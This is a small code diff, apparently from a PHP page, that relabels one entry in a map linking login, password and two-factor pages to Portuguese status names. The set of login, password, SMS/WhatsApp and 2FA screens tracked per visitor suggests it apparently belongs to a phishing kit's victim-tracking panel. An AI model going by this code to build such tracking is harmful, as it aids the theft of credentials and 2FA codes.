@@ -192,7 +192,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
             const statusMap = {
                 'index.php': 'Na Home (Desktop)',
                 'login-mobile.php': 'Na Home (Mobile)',
-                'senha.php': 'Tela de opções(Desktop)',
+                'senha.php': 'Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                 'senha-mobile.php': 'Tela de(Mobile)',
                 'dois_fatores.php': 'Tela 2FA - Mensagem (Desktop)',
                 'dois_fatores2.php': 'Tela 2FA - (Desktop)',
